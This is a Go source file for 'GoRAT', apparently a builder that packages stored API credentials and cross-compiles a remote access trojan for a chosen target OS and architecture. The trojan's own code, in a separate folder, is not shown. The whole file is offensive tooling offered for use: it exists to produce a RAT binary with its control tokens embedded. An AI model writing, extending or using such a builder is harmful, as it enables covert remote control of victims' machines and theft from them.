/*
 * GoRAT 
 * litsnarf - litsnarf at gmail dot com
 */

package main

import (
	"github.com/jessevdk/go-flags"
	"os"
	"./getCredentials"
	"./log"
	"path/filepath"
	"bufio"
	"fmt"
	"strings"
	"os/exec"
	"os/user"
)


var opts struct {

	CreateClientSecret string `long:"createsecret" description:"Create Client Secret: give the path of credentials.json file" value-name:"FILE"`
	CreateRAT bool `long:"createrat" description:"Build the RAT based on the API stored in the config folder"`

	ConfigPath string `long:"config" description:"Path where clients_secret.json and credentials.json are stored" default:"secrets/gorat" value-name:"FILE"`
	ClientSecret string `long:"clientsecret" description:"Path to the client_secret.json file." value-name:"FILE" default:"secrets/gorat/client_secret.json"`
	CredentialsFile string `long:"credentialsFile" description:"Path to the credentials.json file." value-name:"FILE" default:"secrets/gorat/credentials.json"`
}

var (
	secretsPath = ""
	defaultGoratPath = "gorat"
	rootPath = ""
	userosarch []string
	OsArcList = `$GOOS 	$GOARCH
	android 	arm
	darwin 		386
	darwin 		amd64
	darwin 		arm
	darwin 		arm64
	dragonfly 	amd64
	freebsd 	386
	freebsd 	amd64
	freebsd 	arm
	linux 		386
	linux 		amd64
	linux 		arm
	linux 		arm64
	linux 		ppc64
	linux 		ppc64le
	linux 		mips
	linux 		mipsle
	linux 		mips64
	linux 		mips64le
	linux 		s390x
	netbsd 		386
	netbsd 		amd64
	netbsd 		arm
	openbsd 	386
	openbsd 	amd64
	openbsd 	arm
	plan9 		386
	plan9 		amd64
	solaris 	amd64
	windows 	386
	windows 	amd64`
	)

func init(){

	rootPath, _ = os.Getwd()
	secretsPath = filepath.Join(rootPath, "secrets/")

	//Parse arguments
	_, err := flags.Parse(&opts)
	if err != nil {
		os.Exit(0)
	}

	if len(os.Args) < 2{
		log.Infof("No arguments specified. Use -h to print the help")
		os.Exit(0)
	}

}

//check if the path provided by the user is inside the default secrets folder
func checkSecretsPath(userPath string) bool{
	userPath, _ = filepath.Abs(userPath)
	return strings.HasPrefix(userPath, secretsPath)
}

func main(){

	//if --createsecret is set then create client_secret.json
	//else check if client_secret.json exists
	if opts.CreateClientSecret != "" {
		log.Infof("Creating client_secrets.json")

		if !checkSecretsPath(opts.CreateClientSecret){
			log.Fatalf("Please provide a path inside '%s'", secretsPath)
		}

		if (getCredentials.GetCreds(opts.CreateClientSecret)){
			log.Infof("client_secret.json created")
		}
	}

	//If --createrat is set
	if opts.CreateRAT{
		log.Infof("Creating the RAT")

		configPath, _ := filepath.Abs(opts.ConfigPath)
		log.Infof("Using the following path to read the tokens: %s", configPath)

		if configPath == filepath.Join(secretsPath, defaultGoratPath){

			for {
				reader := bufio.NewReader(os.Stdin)
				fmt.Print("[-] Enter a different path or press ENTER to confirm: ")
				userPath, _ := reader.ReadString('\n')
				userPath = strings.Replace(userPath, "\n", "", -1)

				if userPath != "" {
					userPath, _ = filepath.Abs(userPath)
					if checkSecretsPath(userPath){
						configPath = userPath
						break
					}
				}else{
					break
				}
			}
		}

		if _, err := os.Stat(configPath+"/credentials.json"); os.IsNotExist(err) {
			log.Fatalf("File credentials.json not found")
		}
		if _, err := os.Stat(configPath+"/client_secret.json"); os.IsNotExist(err) {
			log.Fatalf("File client_secret.json not found")
		}

		usr, _ := user.Current()
		dir := usr.HomeDir
		currentPath, _ := os.Getwd()

		//Convert path to relative - we need the relative because of the packr thing
		if strings.HasPrefix(configPath, "~/") {
			configPath = filepath.Join(dir, configPath[2:])
			fmt.Printf(configPath)
		}
		if filepath.IsAbs(configPath){
			configPath, _ = filepath.Rel(currentPath, configPath)
		}

		//Enter commando (rat) folder
		err := os.Chdir("cmd/commando")
		if err != nil {
			panic(err)
		}
		currentPath, _ = os.Getwd()


		fmt.Print("Platform and arch to use:" + OsArcList +"\n")

		reader := bufio.NewReader(os.Stdin)

		fmt.Print("[>] Enter the target OS and the ARC (separated by space): ")
		userinput, _ := reader.ReadString('\n')
		userinput = strings.Replace(userinput, "\n", "", -1)
		userosarch = strings.Fields(userinput)

		fmt.Print("[>] Enter the rat filename (and extension in necessary): ")
		filename, _ := reader.ReadString('\n')
		filename = strings.Replace(filename, "\n", "", -1)
		ratbinpath := currentPath+ "/bin/"+filename

		log.Importantf("Building the RAT")

		args := []string{"build","-ldflags", "'-X main.configPath="+ configPath + "'", "-o", ratbinpath}
		cmd := exec.Command("packr", args...)
		cmd.Env = append(os.Environ(),
			"GOOS="+userosarch[0],
			"GOARCH="+userosarch[1],
		)

				//fmt.Printf("%+v\n", cmd)
		if err := cmd.Run(); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		log.Infof("Rat successfully created in: %s ", ratbinpath )
	}
}